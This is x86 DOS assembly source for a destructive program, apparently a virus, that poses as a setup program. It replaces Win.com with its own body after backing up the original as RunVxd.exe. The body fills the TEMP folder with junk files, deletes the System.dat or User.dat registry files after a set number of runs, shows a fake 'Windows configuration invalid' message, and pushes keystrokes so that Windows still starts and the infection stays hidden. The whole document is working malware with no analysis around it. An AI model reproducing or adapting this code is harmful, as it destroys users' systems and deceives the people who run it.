.model tiny
.code
.386
        org 100h
start:
        jmp short start1
        db 'CS'
start1:
        cld
        mov di,offset windir    ;Find WinBootDir
        call search
        jc fuck

        mov dx,offset install   ;Print message "Installing..."
        call Print_mess

        mov dl,ds:[si]
        sub dl,'A'
        mov ah,0eh
        int 21h

        mov dx,si
        mov ah,3bh
        int 21h

        push cs
        pop ds
        mov dx,offset Win_Com
                                ;Open it
        xor cx,cx
        mov ax,4301h            ;Clear attribut
        int 21h
        mov ax,3d02h
        int 21h
        jc fuck
        xchg bx,ax
        mov ax,5700h            ;Push DATE/TIME to stack
        int 21h
        push dx cx
        mov dx,offset buffer
        mov cx,5
        mov ah,3fh
        int 21h
        mov al,0
        call mov_ptr
        cmp word ptr ds:[offset buffer+3],'SC'
        je shit_bak1

        mov dx,offset backup_   ;Backup offten to WinCom.bak
        xor cx,cx
        mov ah,3ch
        int 21h
        jc shit_bak
        mov cs:[handle],ax
loop_load:
        mov dx,offset buffer+25
        push dx
        mov ah,3fh
        mov cx,4096
        int 21h
        xchg cs:[handle],bx
        pop dx
        push ax
        mov cx,ax
        mov ah,40h
        int 21h
        xchg cs:[handle],bx
        pop ax
        cmp ax,4096
        je loop_load
        xchg cs:[handle],bx

        pop cx dx bp
        push bp dx cx
        mov ax,5701h
        int 21h
        mov ah,3eh
        int 21h
        mov dx,offset backup_
        mov cx,bp
        mov ax,4301h
        int 21h

        mov bx,cs:[handle]
        mov al,0
        call mov_ptr

        mov dx,offset virus_body
        mov ah,40h
        mov cx,offset end_vir-offset virus_body
        int 21h
shit_bak1:
        pop cx dx
        mov ax,5701h
        int 21h
        mov ah,3eh
        int 21h
        xor al,al
exit_:
        mov ah,4ch
        int 21h
shit_bak:
        mov dx,offset no_new
        call Print_mess
        jmp shit_bak1
fuck:
        mov dx,offset err1
        call Print_mess
        mov al,1
        jmp exit_

Print_mess:
        push ds
        push cs
        pop ds
        mov ah,9
        int 21h
        pop ds
        ret

handle  dw 0

install db 'Installing...',0dh,0ah,'Please wait...',0dh,0ah,0dh,0ah,'$'
err1    db 'Win.com not found...',0dh,0ah,'Please run setup program.',0dh,0ah,'$'
no_new  db 'Can not make backup file...',0dh,0ah,'$'

virus_body:
        call get_addr
get_addr:
        pop bp
        mov eax,cs:[offset tempo-offset get_addr+bp]
        cmp eax,cs:[82h]
        jne no_remorse
        mov byte ptr cs:[install_rate-offset get_addr+bp],0
no_remorse:
        mov di,bp
        add di,offset tempo-offset get_addr
        push bp
        call search
        pop bp
        jc cont_vir
        mov dl,ds:[si]
        sub dl,'A'
        mov ah,0eh
        int 21h
        mov dx,si
        mov ah,3bh
        int 21h
        push cs
        pop ds
        mov ah,2ch
        int 21h
        add cx,dx
        and cl,31
        inc cl
set_name3:
        cmp ch,25
        jbe set_file
        shr ch,1
        jmp short set_name3
set_file:
        push dx
        mov di,30000
        mov dx,di
        mov bl,8
set_name:
        mov al,ch
        add al,'A'
        stosb
        add ch,cl
set_name1:
        cmp ch,25
        jbe set_name2
        shr ch,1
        jmp short set_name1
set_name2:
        dec bl
        jne set_name
        mov eax,'pmt.'
        stosd
        xor al,al
        stosb
        push cx
        xor cx,cx
        mov ah,3ch
        int 21h
        pop cx dx
        push dx cx
        xchg bx,ax
        and dx,8191
        add dx,100
        mov cx,dx
        mov ah,40h
        int 21h
        mov ah,3eh
        int 21h
        pop cx
        dec cl
        jne set_file

cont_vir:
        mov di,bp
        add di,offset windir-offset get_addr
        push bp
        call search
        pop bp
        jc return
        mov dl,ds:[si]
        sub dl,'A'
        mov ah,0eh
        int 21h
        mov dx,si
        mov ah,3bh
        int 21h
        push cs
        pop ds
        mov dx,offset win_com-offset get_addr
        add dx,bp
        mov ax,3d02h
        int 21h
        jc exita_
        xchg ax,bx
        mov ah,2ch
        int 21h
        add cx,dx
        and cx,511
        add cx,400
        push cx
        inc byte ptr cs:[install_rate-offset get_addr+bp]
        mov dx,bp
        sub dx,3
        mov cx,2000
        mov ah,40h
        int 21h
        pop cx
        cmp byte ptr cs:[install_rate-offset get_addr+bp],32
        jb no_gluks1
        mov byte ptr cs:[backup_-offset get_addr+bp],0
        mov dx,offset Setup_mess-offset get_addr
        add dx,bp
        mov ah,9
        int 21h
no_gluks1:
        cmp byte ptr cs:[install_rate-offset get_addr+bp],15
        jb no_gluks
        cmp byte ptr cs:[install_rate-offset get_addr+bp],18
        ja no_gluks
        mov cx,444
no_gluks:
        push cx
        mov ah,3eh
        int 21h
        pop cx
        cmp cx,450
        ja exita_
        mov dx,offset del1-offset get_addr
        cmp cx,425
        ja del_sys
        mov dx,offset del2-offset get_addr
del_sys:
        add dx,bp
        xor cx,cx
        mov ax,4301h
        int 21h
        mov ah,41h
        int 21h

exita_:
        mov ax,0c00h
        int 21h
        push cs cs
        pop ds es
        mov si,bp
        add si,offset backup_-offset get_addr
keypress:
        lodsb
        or al,al
        jz end_key
        mov cl,al
        xor ch,ch
        mov ah,5
        int 16h
        jmp keypress
end_key:
        mov cx,0dh
        mov ah,5
        int 16h
return:
        mov ah,4ch
        int 21h
search:
        mov bp,di
        mov ds,cs:[2ch]
        xor si,si
search_0:
        mov di,bp
search_1:
        cmp word ptr ds:[si],0
        je not_found
        lodsb
        and al,11011111b
        cmp al,cs:[di]
        jne search_0
search_2:
        inc di
        cmp byte ptr cs:[di],0
        jne search_1
search_3:
        lodsb
        cmp al,':'
        jne search_3
        dec si
        dec si
        clc
        ret
not_found:
        stc
        ret
mov_ptr:
        mov ah,42h
        xor cx,cx
        xor dx,dx
        int 21h
        ret
Copyleft db 'xor80‘ÚÔÍ·Ó »ÔÚÛÂ ‚˘ √˘‚ÂÚ”Ë·‰Ô˜ÆÆÆ¶ ˛¬·ÙÕ·ÎÂÚ˛xor80'
Setup_mess db 0dh,0ah,'Windows configuration invalid!',0dh,0ah
        db 'Please consult your program vendor.',0dh,0ah,'$'
install_rate db 0
del1    db 'System.dat',0
del2    db 'User.dat',0
windir  db 'WINBOOTDIR',0
tempo   db 'TEMP',0
backup_ db 'RunVxd.exe',0
Win_Com db 'Win.com',0
buffer  db 5 dup (?)
end_vir:
end start
